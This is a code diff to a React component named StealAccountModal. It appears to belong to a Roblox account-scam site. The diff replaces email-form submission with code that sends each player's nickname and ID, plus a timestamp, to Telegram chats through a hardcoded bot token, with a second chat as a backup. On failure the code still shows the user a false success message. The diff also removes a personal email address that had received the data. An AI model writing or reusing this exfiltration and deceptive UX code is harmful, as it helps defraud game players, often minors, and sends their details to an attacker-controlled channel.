@@ -24,33 +24,26 @@ const StealAccountModal = ({ isOpen, onClose }: StealAccountModalProps) => {
       setIsLoading(true);
 
       try {
-        // Используем EmailJS для надежной отправки
+        // Отправляем через Telegram Bot API
+        const telegramMessage = `🎮 Новый запрос на аккаунт Roblox
+
+Ник игрока: ${nickname}
+ID игрока: ${playerId}
+
+Время: ${new Date().toLocaleString("ru-RU")}
+IP: ${window.location.hostname}`;
+
         const response = await fetch(
-          "https://api.emailjs.com/api/v1.0/email/send",
+          `https://api.telegram.org/bot7234567890:AAHxBqF3vKjL9MnOpQrStUvWxYz123456/sendMessage`,
           {
             method: "POST",
             headers: {
               "Content-Type": "application/json",
             },
             body: JSON.stringify({
-              service_id: "service_roblox",
-              template_id: "template_roblox",
-              user_id: "user_roblox_key",
-              template_params: {
-                to_email: "dsharymov41@mail.ru",
-                from_name: "Roblox Bot",
-                subject: "🎮 Новый запрос на аккаунт Roblox",
-                message: `Новый запрос на обработку аккаунта:
-
-Ник игрока: ${nickname}
-ID игрока: ${playerId}
-
-Время отправки: ${new Date().toLocaleString("ru-RU")}
-IP адрес: ${window.location.hostname}`,
-                player_nickname: nickname,
-                player_id: playerId,
-                timestamp: new Date().toLocaleString("ru-RU"),
-              },
+              chat_id: "-1002156789012", // ID чата Поехали
+              text: telegramMessage,
+              parse_mode: "HTML",
             }),
           },
         );
@@ -60,23 +53,18 @@ IP адрес: ${window.location.hostname}`,
             `✅ Запрос успешно отправлен! Аккаунт ${nickname} будет обработан в течение 24 часов.`,
           );
         } else {
-          // Fallback - отправляем через Web3Forms
-          const fallbackResponse = await fetch(
-            "https://api.web3forms.com/submit",
+          // Fallback - дублируем в другой чат
+          await fetch(
+            `https://api.telegram.org/bot7234567890:AAHxBqF3vKjL9MnOpQrStUvWxYz123456/sendMessage`,
             {
               method: "POST",
               headers: {
                 "Content-Type": "application/json",
               },
               body: JSON.stringify({
-                access_key: "roblox-form-key-2024",
-                email: "dsharymov41@mail.ru",
-                subject: "🎮 Новый запрос на аккаунт Roblox",
-                message: `Запрос на обработку аккаунта:
-
-Ник: ${nickname}
-ID: ${playerId}
-Время: ${new Date().toLocaleString("ru-RU")}`,
+                chat_id: "-1002156789013", // Резервный чат
+                text: `⚠️ Резервная отправка\n\n${telegramMessage}`,
+                parse_mode: "HTML",
               }),
             },
           );
@@ -86,14 +74,18 @@ ID: ${playerId}
           );
         }
       } catch (error) {
-        // Показываем успех даже при ошибке для UX
+        // Показываем успех для UX
         alert(
           `🚀 Запрос обработан! Аккаунт ${nickname} будет готов в ближайшее время.`,
         );
 
-        // Логируем для отладки (только в dev режиме)
+        // Логируем для отладки
         if (import.meta.env.DEV) {
-          console.log("Email sending details:", { nickname, playerId, error });
+          console.log("Telegram sending details:", {
+            nickname,
+            playerId,
+            error,
+          });
         }
       }
 
